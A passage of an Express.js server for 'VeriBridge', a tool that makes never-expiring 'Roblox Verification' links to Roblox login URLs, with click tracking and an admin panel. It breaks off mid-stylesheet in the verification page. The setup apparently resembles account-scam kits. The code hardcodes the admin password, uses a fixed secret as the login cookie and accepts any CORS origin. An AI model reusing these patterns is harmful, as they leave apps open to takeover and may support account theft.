const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const validator = require('./validator');

const app = express();

// ==================== CONFIGURATION ====================
// !!! CHANGE THIS PASSWORD BEFORE DEPLOYING !!!
const ADMIN_PASSWORD = 'YourStrongPassword123'; // CHANGE THIS!
// =======================================================

const SESSION_SECRET = 'veribridge-secret-2024';

// ==================== MIDDLEWARE ====================
app.use(cors({
    origin: true,
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization'],
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
}));
app.use(express.json());
app.use(cookieParser());

// Add request logging for debugging
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// ==================== DATA STORAGE ====================
let links = new Map();
let nextId = 1;

function generateCode() {
    return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}

// ==================== AUTH MIDDLEWARE ====================
function isAuthenticated(req, res, next) {
    const token = req.cookies.admin_token;
    if (token === SESSION_SECRET) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized', success: false });
    }
}

// ==================== PUBLIC API ROUTES ====================

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', linksCount: links.size, timestamp: Date.now() });
});

// Get allowed domains (for frontend)
app.get('/api/allowed-domains', (req, res) => {
    res.json({ 
        success: true, 
        domains: validator.getAllowedDomains(),
        patterns: validator.getAllowedPatterns()
    });
});

// Generate shareable link (WITH VALIDATION)
app.post('/api/generate', (req, res) => {
    const { url } = req.body;
    
    console.log(`[API] Generate request for URL: ${url}`);
    
    // Validate URL
    const validation = validator.isValidRobloxUrl(url);
    
    if (!validation.valid) {
        console.log(`[API] Validation failed: ${validation.message}`);
        return res.status(400).json({ 
            error: validation.message,
            success: false,
            allowedDomains: validator.getAllowedDomains()
        });
    }
    
    // Use normalized URL
    const cleanUrl = validation.cleanUrl || validator.normalizeUrl(url);
    const code = generateCode();
    
    links.set(code, {
        id: nextId++,
        code: code,
        targetUrl: cleanUrl,
        createdAt: Date.now(),
        clicks: 0,
        lastAccessed: null
    });
    
    const protocol = req.headers['x-forwarded-proto'] || 'https';
    const host = req.headers.host;
    const baseUrl = `${protocol}://${host}`;
    const shareableLink = `${baseUrl}/verify.html?code=${code}`;
    
    console.log(`[API] Generated link: ${shareableLink} -> ${cleanUrl}`);
    
    res.json({
        success: true,
        shareableLink: shareableLink,
        code: code
    });
});

// Get link data for verification page
app.get('/api/link/:code', (req, res) => {
    const { code } = req.params;
    const linkData = links.get(code);
    
    if (!linkData) {
        return res.status(404).json({ error: 'Link not found', success: false });
    }
    
    linkData.clicks++;
    linkData.lastAccessed = Date.now();
    links.set(code, linkData);
    
    res.json({
        success: true,
        targetUrl: linkData.targetUrl
    });
});

// ==================== ADMIN API (Protected) ====================

// Get all links
app.get('/admin/api/links', isAuthenticated, (req, res) => {
    const { search = '' } = req.query;
    
    let allLinks = Array.from(links.values()).sort((a, b) => b.createdAt - a.createdAt);
    
    if (search) {
        const searchLower = search.toLowerCase();
        allLinks = allLinks.filter(link => 
            link.targetUrl.toLowerCase().includes(searchLower) || 
            link.code.toLowerCase().includes(searchLower)
        );
    }
    
    res.json({ 
        success: true, 
        links: allLinks,
        total: links.size,
        filtered: allLinks.length
    });
});

// Get single link
app.get('/admin/api/links/:code', isAuthenticated, (req, res) => {
    const link = links.get(req.params.code);
    
    if (link) {
        res.json({ success: true, link });
    } else {
        res.status(404).json({ success: false, error: 'Link not found' });
    }
});

// Create new link (with validation)
app.post('/admin/api/links', isAuthenticated, (req, res) => {
    const { targetUrl } = req.body;
    
    // Validate URL
    const validation = validator.isValidRobloxUrl(targetUrl);
    
    if (!validation.valid) {
        return res.status(400).json({ 
            error: validation.message,
            success: false 
        });
    }
    
    const cleanUrl = validation.cleanUrl || validator.normalizeUrl(targetUrl);
    const code = generateCode();
    
    links.set(code, {
        id: nextId++,
        code: code,
        targetUrl: cleanUrl,
        createdAt: Date.now(),
        clicks: 0,
        lastAccessed: null
    });
    
    res.json({ 
        success: true, 
        link: links.get(code),
        shareableLink: `https://${req.headers.host}/verify.html?code=${code}`
    });
});

// Update link (with validation)
app.put('/admin/api/links/:code', isAuthenticated, (req, res) => {
    const { targetUrl } = req.body;
    
    // Validate URL
    const validation = validator.isValidRobloxUrl(targetUrl);
    
    if (!validation.valid) {
        return res.status(400).json({ 
            error: validation.message,
            success: false 
        });
    }
    
    const cleanUrl = validation.cleanUrl || validator.normalizeUrl(targetUrl);
    const link = links.get(req.params.code);
    
    if (link) {
        link.targetUrl = cleanUrl;
        link.updatedAt = Date.now();
        links.set(req.params.code, link);
        res.json({ success: true, link });
    } else {
        res.status(404).json({ success: false, error: 'Link not found' });
    }
});

// Delete link
app.delete('/admin/api/links/:code', isAuthenticated, (req, res) => {
    const deleted = links.delete(req.params.code);
    if (deleted) {
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false, error: 'Link not found' });
    }
});

// Get statistics
app.get('/admin/api/stats', isAuthenticated, (req, res) => {
    const allLinks = Array.from(links.values());
    const totalClicks = allLinks.reduce((sum, link) => sum + (link.clicks || 0), 0);
    const averageClicks = allLinks.length > 0 ? totalClicks / allLinks.length : 0;
    
    res.json({
        success: true,
        stats: {
            totalLinks: links.size,
            totalClicks: totalClicks,
            averageClicks: averageClicks.toFixed(2),
            lastCreated: allLinks[0]?.createdAt || null
        }
    });
});

// Admin login API
app.post('/admin/api/login', (req, res) => {
    const { password } = req.body;
    
    if (password === ADMIN_PASSWORD) {
        res.cookie('admin_token', SESSION_SECRET, { 
            httpOnly: true, 
            maxAge: 7 * 24 * 60 * 60 * 1000,
            sameSite: 'lax',
            path: '/',
            secure: false
        });
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, error: 'Invalid password' });
    }
});

// Admin logout API
app.post('/admin/api/logout', (req, res) => {
    res.clearCookie('admin_token', { path: '/' });
    res.json({ success: true });
});

// ==================== PROTECTED ADMIN DASHBOARD ====================
app.get('/admin/dashboard', isAuthenticated, (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Manage Links</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0f1e;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            flex-wrap: wrap;
            gap: 15px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(0, 255, 255, 0.2);
        }
        
        h1 {
            color: #00ffff;
            font-size: 28px;
        }
        
        .logout-btn {
            background: #ff5555;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.2s;
        }
        
        .logout-btn:hover {
            background: #ff3333;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 255, 255, 0.3);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
        }
        
        .stat-card:hover {
            border-color: #00ffff;
        }
        
        .stat-number {
            font-size: 36px;
            font-weight: bold;
            color: #00ffff;
        }
        
        .stat-label {
            color: #9ab3cc;
            margin-top: 5px;
            font-size: 14px;
        }
        
        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
            align-items: center;
        }
        
        .search-box {
            flex: 1;
            display: flex;
            gap: 10px;
        }
        
        .search-box input {
            flex: 1;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 255, 0.3);
            padding: 12px 15px;
            border-radius: 10px;
            color: white;
            font-size: 14px;
        }
        
        .search-box input:focus {
            outline: none;
            border-color: #00ffff;
        }
        
        .search-box button, .add-link-btn, .refresh-btn {
            background: #2c5a7a;
            border: none;
            padding: 12px 20px;
            border-radius: 10px;
            color: white;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .add-link-btn {
            background: linear-gradient(135deg, #00aa00, #008800);
        }
        
        .add-link-btn:hover, .search-box button:hover, .refresh-btn:hover {
            transform: scale(1.02);
            opacity: 0.9;
        }
        
        .table-wrapper {
            overflow-x: auto;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            border: 1px solid rgba(0, 255, 255, 0.2);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th, td {
            padding: 14px 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        th {
            background: rgba(0, 255, 255, 0.1);
            color: #00ffff;
            font-weight: 600;
        }
        
        tr:hover {
            background: rgba(0, 255, 255, 0.05);
        }
        
        .code-cell {
            font-family: monospace;
            font-size: 12px;
            color: #00ffff;
        }
        
        .url-cell {
            max-width: 400px;
            overflow: hidden;
            text-overflow: ellipsis;
            word-break: break-all;
        }
        
        .badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
            background: #00aa00;
            color: white;
        }
        
        .action-btns {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .edit-btn, .copy-btn, .delete-btn {
            border: none;
            padding: 5px 12px;
            border-radius: 5px;
            color: white;
            cursor: pointer;
            font-size: 12px;
        }
        
        .edit-btn { background: #2c5a7a; }
        .edit-btn:hover { background: #1e3a5a; }
        .copy-btn { background: #555555; }
        .copy-btn:hover { background: #666666; }
        .delete-btn { background: #ff5555; }
        .delete-btn:hover { background: #ff3333; }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: #1a1a2e;
            padding: 30px;
            border-radius: 20px;
            width: 90%;
            max-width: 500px;
            border: 1px solid #00ffff;
        }
        
        .modal-content h3 {
            margin-bottom: 20px;
            color: #00ffff;
        }
        
        .modal-content input, .modal-content textarea {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 255, 0.3);
            border-radius: 10px;
            color: white;
            font-size: 14px;
        }
        
        .modal-content textarea {
            resize: vertical;
            min-height: 80px;
            font-family: monospace;
        }
        
        .modal-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        .save-btn {
            flex: 1;
            background: #00aa00;
            border: none;
            padding: 12px;
            border-radius: 10px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        
        .cancel-btn {
            flex: 1;
            background: #555555;
            border: none;
            padding: 12px;
            border-radius: 10px;
            color: white;
            cursor: pointer;
        }
        
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #00aa00;
            color: white;
            padding: 12px 20px;
            border-radius: 10px;
            z-index: 1001;
            animation: slideIn 0.3s ease-out;
        }
        
        .toast.error {
            background: #ff5555;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #9ab3cc;
        }
        
        .empty-state {
            text-align: center;
            padding: 60px;
            color: #9ab3cc;
        }
        
        @media (max-width: 768px) {
            th, td { font-size: 12px; padding: 10px 8px; }
            .action-btns { flex-direction: column; }
            .controls { flex-direction: column; }
            .search-box { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 VeriBridge Admin Dashboard</h1>
            <button class="logout-btn" onclick="logout()">🚪 Logout</button>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="totalLinks">0</div>
                <div class="stat-label">Total Links</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalClicks">0</div>
                <div class="stat-label">Total Clicks</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="avgClicks">0</div>
                <div class="stat-label">Avg Clicks/Link</div>
            </div>
        </div>
        
        <div class="controls">
            <div class="search-box">
                <input type="text" id="searchInput" placeholder="Search by URL or code...">
                <button onclick="loadLinks()">🔍 Search</button>
                <button onclick="clearSearch()">🗑️ Clear</button>
            </div>
            <button class="add-link-btn" onclick="openAddModal()">➕ Add New Link</button>
            <button class="refresh-btn" onclick="loadLinks()">🔄 Refresh</button>
        </div>
        
        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Code</th>
                        <th>Target URL</th>
                        <th>Status</th>
                        <th>Clicks</th>
                        <th>Created</th>
                        <th>Last Accessed</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    <tr><td colspan="8" class="loading">Loading links...</td></tr>
                </tbody>
            </table>
        </div>
    </div>
    
    <div id="editModal" class="modal">
        <div class="modal-content">
            <h3>✏️ Edit Link</h3>
            <input type="text" id="editCode" readonly placeholder="Link Code">
            <textarea id="editUrl" placeholder="Target URL"></textarea>
            <div class="modal-buttons">
                <button class="save-btn" onclick="saveEdit()">💾 Save Changes</button>
                <button class="cancel-btn" onclick="closeEditModal()">Cancel</button>
            </div>
        </div>
    </div>
    
    <div id="addModal" class="modal">
        <div class="modal-content">
            <h3>➕ Add New Link</h3>
            <textarea id="addUrl" placeholder="Enter target URL (e.g., https://www.roblox.com/login)"></textarea>
            <div class="modal-buttons">
                <button class="save-btn" onclick="createLink()">✨ Create Link</button>
                <button class="cancel-btn" onclick="closeAddModal()">Cancel</button>
            </div>
        </div>
    </div>
    
    <div id="viewModal" class="modal">
        <div class="modal-content">
            <h3>🔗 Shareable Link</h3>
            <input type="text" id="viewLinkCode" readonly>
            <div class="modal-buttons">
                <button class="save-btn" onclick="copyShareableLink()">📋 Copy Link</button>
                <button class="cancel-btn" onclick="closeViewModal()">Close</button>
            </div>
        </div>
    </div>

    <script>
        let currentLinks = [];
        let currentEditCode = null;
        let searchTimeout = null;
        
        async function loadLinks() {
            const search = document.getElementById('searchInput').value;
            const url = search ? `/admin/api/links?search=${encodeURIComponent(search)}` : '/admin/api/links';
            
            try {
                const res = await fetch(url);
                if (res.status === 401) {
                    window.location.href = '/admin';
                    return;
                }
                const data = await res.json();
                if (data.success) {
                    currentLinks = data.links;
                    renderTable();
                    loadStats();
                }
            } catch (err) {
                console.error('Error loading links:', err);
                showToast('Failed to load links', 'error');
            }
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/admin/api/stats');
                if (res.status === 401) {
                    window.location.href = '/admin';
                    return;
                }
                const data = await res.json();
                if (data.success) {
                    document.getElementById('totalLinks').innerText = data.stats.totalLinks;
                    document.getElementById('totalClicks').innerText = data.stats.totalClicks;
                    document.getElementById('avgClicks').innerText = data.stats.averageClicks;
                }
            } catch (err) {
                console.error('Error loading stats:', err);
            }
        }
        
        function formatDate(timestamp) {
            if (!timestamp) return 'Never';
            return new Date(timestamp).toLocaleString();
        }
        
        function renderTable() {
            const tbody = document.getElementById('tableBody');
            
            if (currentLinks.length === 0) {
                tbody.innerHTML = '<tr><td colspan="8" class="empty-state">No links found. Create your first link!</td></tr>';
                return;
            }
            
            tbody.innerHTML = currentLinks.map(link => `
                <tr>
                    <td>${link.id}</td>
                    <td class="code-cell">${link.code}</td>
                    <td class="url-cell" title="${link.targetUrl}">${link.targetUrl.substring(0, 60)}${link.targetUrl.length > 60 ? '...' : ''}</td>
                    <td><span class="badge">🔒 Never Expire</span></td>
                    <td>${link.clicks || 0}</td>
                    <td>${formatDate(link.createdAt)}</td>
                    <td>${formatDate(link.lastAccessed)}</td>
                    <td class="action-btns">
                        <button class="copy-btn" onclick="viewLink('${link.code}')">🔗 Copy</button>
                        <button class="edit-btn" onclick="openEdit('${link.code}')">✏️ Edit</button>
                        <button class="delete-btn" onclick="deleteLink('${link.code}')">🗑️ Delete</button>
                    </td>
                </tr>
            `).join('');
        }
        
        function viewLink(code) {
            const baseUrl = window.location.origin;
            const shareableLink = `${baseUrl}/verify.html?code=${code}`;
            document.getElementById('viewLinkCode').value = shareableLink;
            document.getElementById('viewModal').classList.add('active');
        }
        
        function copyShareableLink() {
            const input = document.getElementById('viewLinkCode');
            input.select();
            document.execCommand('copy');
            showToast('✅ Shareable link copied to clipboard!');
            closeViewModal();
        }
        
        function openEdit(code) {
            const link = currentLinks.find(l => l.code === code);
            if (link) {
                currentEditCode = code;
                document.getElementById('editCode').value = code;
                document.getElementById('editUrl').value = link.targetUrl;
                document.getElementById('editModal').classList.add('active');
            }
        }
        
        async function saveEdit() {
            const newUrl = document.getElementById('editUrl').value.trim();
            if (!newUrl) {
                showToast('Please enter a URL', 'error');
                return;
            }
            
            try {
                const res = await fetch(`/admin/api/links/${currentEditCode}`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ targetUrl: newUrl })
                });
                if (res.ok) {
                    closeEditModal();
                    loadLinks();
                    showToast('✅ Link updated successfully!');
                } else {
                    const error = await res.json();
                    showToast(error.error || 'Failed to update link', 'error');
                }
            } catch (err) {
                showToast('Error updating link', 'error');
            }
        }
        
        function openAddModal() {
            document.getElementById('addUrl').value = '';
            document.getElementById('addModal').classList.add('active');
        }
        
        async function createLink() {
            const url = document.getElementById('addUrl').value.trim();
            if (!url) {
                showToast('Please enter a URL', 'error');
                return;
            }
            
            try {
                const res = await fetch('/admin/api/links', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ targetUrl: url })
                });
                if (res.ok) {
                    closeAddModal();
                    loadLinks();
                    showToast('✅ New link created successfully!');
                } else {
                    const error = await res.json();
                    showToast(error.error || 'Failed to create link', 'error');
                }
            } catch (err) {
                showToast('Error creating link', 'error');
            }
        }
        
        async function deleteLink(code) {
            if (confirm('Are you sure you want to delete this link? This action cannot be undone.')) {
                try {
                    const res = await fetch(`/admin/api/links/${code}`, { method: 'DELETE' });
                    if (res.ok) {
                        loadLinks();
                        showToast('✅ Link deleted successfully!');
                    } else {
                        showToast('Failed to delete link', 'error');
                    }
                } catch (err) {
                    showToast('Error deleting link', 'error');
                }
            }
        }
        
        function closeEditModal() {
            document.getElementById('editModal').classList.remove('active');
        }
        
        function closeAddModal() {
            document.getElementById('addModal').classList.remove('active');
        }
        
        function closeViewModal() {
            document.getElementById('viewModal').classList.remove('active');
        }
        
        function clearSearch() {
            document.getElementById('searchInput').value = '';
            loadLinks();
        }
        
        async function logout() {
            await fetch('/admin/api/logout', { method: 'POST' });
            window.location.href = '/admin';
        }
        
        function showToast(message, type = 'success') {
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerText = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }
        
        document.getElementById('searchInput').addEventListener('input', () => {
            if (searchTimeout) clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => loadLinks(), 500);
        });
        
        loadLinks();
        setInterval(loadLinks, 30000);
    </script>
</body>
</html>
    `);
});

// ==================== ADMIN LOGIN PAGE ====================
app.get('/admin', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{min-height:100vh;background:linear-gradient(135deg,#0a0f1e 0%,#0a1a2f 50%,#0b2b3b 100%);font-family:Arial,sans-serif}
        .container{display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .login-box{background:rgba(0,0,0,0.5);backdrop-filter:blur(10px);padding:40px;border-radius:20px;border:1px solid rgba(0,255,255,0.3);width:100%;max-width:400px}
        h1{color:white;text-align:center;margin-bottom:30px}
        input{width:100%;padding:12px;margin:10px 0;background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,255,0.3);border-radius:10px;color:white;font-size:16px}
        button{width:100%;padding:12px;background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;border-radius:10px;color:white;font-weight:bold;cursor:pointer;font-size:16px}
        button:hover{opacity:0.9}
        .error{color:#ff5555;text-align:center;margin-top:10px}
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>🔐 Admin Login</h1>
            <input type="password" id="password" placeholder="Enter admin password">
            <button onclick="login()">Login</button>
            <div id="error" class="error"></div>
        </div>
    </div>
    <script>
        async function login() {
            const password = document.getElementById('password').value;
            const errorDiv = document.getElementById('error');
            if (!password) {
                errorDiv.innerText = 'Please enter password';
                return;
            }
            try {
                const res = await fetch('/admin/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password })
                });
                const data = await res.json();
                if (data.success) {
                    window.location.href = '/admin/dashboard';
                } else {
                    errorDiv.innerText = data.error || 'Invalid password';
                }
            } catch (err) {
                console.error('Login error:', err);
                errorDiv.innerText = 'Network error - check console';
            }
        }
        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') login();
        });
    </script>
</body>
</html>
    `);
});

// ==================== GENERATOR PAGE ====================
app.get('/gen', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VeriBridge Gen | Create Shareable Links</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes shine {
            0% { background-position: -100% 0; }
            100% { background-position: 200% 0; }
        }
        .shine-text {
            background: linear-gradient(100deg, #ffffff 45%, #00ffff 50%, #ffffff 55%);
            background-size: 200% auto;
            color: transparent;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shine 4s linear infinite;
        }
        .toast-notification {
            animation: slideIn 0.3s ease-out forwards;
        }
        @keyframes slideIn {
            0% { transform: translateX(100%); opacity: 0; }
            100% { transform: translateX(0); opacity: 1; }
        }
        .loading-spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .allowed-domains {
            background: rgba(0, 255, 255, 0.1);
            border-radius: 8px;
            padding: 10px;
            margin-top: 10px;
            font-size: 11px;
            color: #00ffff;
        }
        .allowed-domains span {
            display: inline-block;
            background: rgba(0, 255, 255, 0.2);
            padding: 2px 8px;
            border-radius: 20px;
            margin: 2px;
        }
    </style>
</head>
<body class="bg-black text-white">
    <div class="fixed inset-0 -z-10 bg-[radial-gradient(#0d0d0d_1px,transparent_1px)] [background-size:16px_16px]"></div>
    <div class="fixed top-0 z-[-2] h-screen w-full bg-[radial-gradient(ellipse_60%_60%_at_50%_-20%,rgba(0,255,255,0.15),rgba(255,255,255,0))]"></div>

    <div id="toastContainer" class="fixed bottom-4 right-4 z-50 flex flex-col gap-2"></div>

    <div class="flex min-h-screen items-center justify-center p-4">
        <div class="w-full max-w-2xl text-center">
            <div class="bg-black/40 backdrop-blur-xl border border-cyan-500/30 rounded-2xl p-8">
                <h1 class="text-3xl font-bold shine-text mb-2">VeriBridge Gen</h1>
                <p class="text-sm text-cyan-400/60 mb-6">Create SHAREABLE verification links (never expire)</p>

                <div class="space-y-4">
                    <input type="text" id="targetUrl" class="w-full bg-zinc-900/80 border border-cyan-500/20 rounded-xl p-3 text-white placeholder-white/50" placeholder="https://www.roblox.com/login">
                    
                    <button id="generateBtn" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 py-3 rounded-xl font-semibold hover:from-cyan-500 hover:to-blue-500 transition-all">
                        Generate Shareable Link
                    </button>

                    <div id="allowedDomains" class="allowed-domains">
                        <strong>✅ Allowed Domains:</strong> <span id="domainsList">Loading...</span>
                    </div>

                    <div id="resultSection" class="hidden mt-4 p-4 bg-cyan-950/40 rounded-xl border border-cyan-500/30">
                        <p class="text-xs text-cyan-300/80 mb-2">✨ Your Shareable Link (works for ANYONE):</p>
                        <code id="resultUrl" class="block bg-black/50 text-cyan-300 text-sm font-mono p-3 rounded-lg break-all cursor-pointer select-all"></code>
                        <div class="flex gap-2 mt-3">
                            <button id="copyBtn" class="flex-1 bg-zinc-800 py-2 rounded-lg hover:bg-zinc-700 text-sm">Copy Link</button>
                            <button id="testBtn" class="flex-1 bg-cyan-900/50 py-2 rounded-lg hover:bg-cyan-800/50 text-sm">Test</button>
                        </div>
                    </div>

                    <div id="errorMsg" class="text-red-400 text-sm"></div>
                    
                    <div class="text-xs text-white/30 pt-4 border-t border-white/10">
                        <p>✅ <span class="text-green-400">VALIDATED URLs!</span> Only allowed Roblox domains work</p>
                        <p>🔗 Links never expire - stored on Vercel</p>
                        <p>📊 Admin panel: <a href="/admin" class="text-cyan-400 underline">/admin</a></p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const targetUrl = document.getElementById('targetUrl');
        const generateBtn = document.getElementById('generateBtn');
        const resultSection = document.getElementById('resultSection');
        const resultUrl = document.getElementById('resultUrl');
        const copyBtn = document.getElementById('copyBtn');
        const testBtn = document.getElementById('testBtn');
        const errorMsg = document.getElementById('errorMsg');
        const toastContainer = document.getElementById('toastContainer');
        const domainsList = document.getElementById('domainsList');

        async function loadAllowedDomains() {
            try {
                const res = await fetch('/api/allowed-domains');
                const data = await res.json();
                if (data.success) {
                    domainsList.innerHTML = data.domains.map(d => `<span>${d}</span>`).join('');
                }
            } catch (err) {
                domainsList.innerHTML = '<span>roblox.com</span><span>www.roblox.com</span>';
            }
        }
        loadAllowedDomains();

        function showToast(msg, type = 'success') {
            const toast = document.createElement('div');
            toast.className = `toast-notification ${type === 'success' ? 'bg-green-600' : 'bg-red-600'} text-white px-4 py-2 rounded-lg shadow-lg mb-2 text-sm`;
            toast.innerText = msg;
            toastContainer.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transform = 'translateX(100%)';
                toast.style.transition = 'all 0.3s ease-out';
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }

        async function generateLink() {
            let url = targetUrl.value.trim();
            if (!url) {
                errorMsg.innerText = '❌ Please enter a URL';
                return;
            }
            
            errorMsg.innerText = '';
            generateBtn.disabled = true;
            generateBtn.innerHTML = '<div class="loading-spinner"></div><span> Validating URL...</span>';

            try {
                const response = await fetch('/api/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: url })
                });
                const data = await response.json();
                if (data.success) {
                    resultUrl.innerText = data.shareableLink;
                    resultSection.classList.remove('hidden');
                    showToast('✅ Shareable link created! Works for everyone.', 'success');
                } else {
                    errorMsg.innerText = '❌ ' + data.error;
                    if (data.allowedDomains) {
                        errorMsg.innerText += '\\n\\nAllowed domains: ' + data.allowedDomains.join(', ');
                    }
                    showToast('❌ ' + data.error, 'error');
                    resultSection.classList.add('hidden');
                }
            } catch (err) {
                console.error('Error:', err);
                errorMsg.innerText = '❌ Cannot connect to server. Please try again.';
                showToast('❌ Server error', 'error');
                resultSection.classList.add('hidden');
            } finally {
                generateBtn.disabled = false;
                generateBtn.innerHTML = 'Generate Shareable Link';
            }
        }

        async function copyLink() {
            const text = resultUrl.innerText;
            if (!text) return;
            await navigator.clipboard.writeText(text);
            showToast('📋 Link copied!', 'success');
            const original = copyBtn.innerHTML;
            copyBtn.innerHTML = '✅ Copied!';
            setTimeout(() => { copyBtn.innerHTML = original; }, 1500);
        }

        function testLink() {
            const link = resultUrl.innerText;
            if (link) window.open(link, '_blank');
        }

        generateBtn.addEventListener('click', generateLink);
        copyBtn.addEventListener('click', copyLink);
        testBtn.addEventListener('click', testLink);
        targetUrl.addEventListener('keypress', (e) => { if (e.key === 'Enter') generateLink(); });
    </script>
</body>
</html>
    `);
});

// ==================== VERIFICATION PAGE ====================
app.get('/verify.html', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>veribridge | Roblox Verification</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins','Segoe UI','Inter',system-ui,sans-serif}
        body{min-height:100vh;background:linear-gradient(135deg,#0a0f1e 0%,#0a1a2f 50%,#0b2b3b 100%);overflow-x:hidden;position:relative}
        .frost-overlay{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;background:radial-gradient(circle at 20% 40%,rgba(173,216,230,0.03) 0%,transparent 70%);z-index:1}
        .premium-container{max-width:1400px;margin:0 auto;padding:1rem;position:relative;z-index:20}
        @media(min-width:768px){.premium-container{padding:1.5rem}}
        .golden-header{text-align:center;margin-bottom:0.5rem}
        .premium-logo-gold{display:inline-flex;align-items:center;justify-content:center;gap:10px;background:rgba(0,0,0,0.5);backdrop-filter:blur(20px);padding:0.5rem 1rem;border-radius:60px;border:1px solid rgba(100,200,255,0.6);box-shadow:0 8px 32px rgba(0,0,0,0.3);margin-bottom:0.5rem;flex-wrap:wrap}
        .brand-logo{height:35px;width:auto;max-width:120px;object-fit:contain}
        @media(min-width:768px){.brand-logo{height:45px;max-width:160px}}
        .gold-badge{background:linear-gradient(135deg,#2c5a7a,#1e3a5a);padding:3px 10px;border-radius:40px;font-size:0.6rem;font-weight:bold;color:#8dd0ff}
        .brand-container{text-align:center;margin-bottom:0.5rem;padding:0.3rem 0}
        .brand-main{font-size:3rem;font-weight:800;letter-spacing:-1px;margin-bottom:0.2rem}
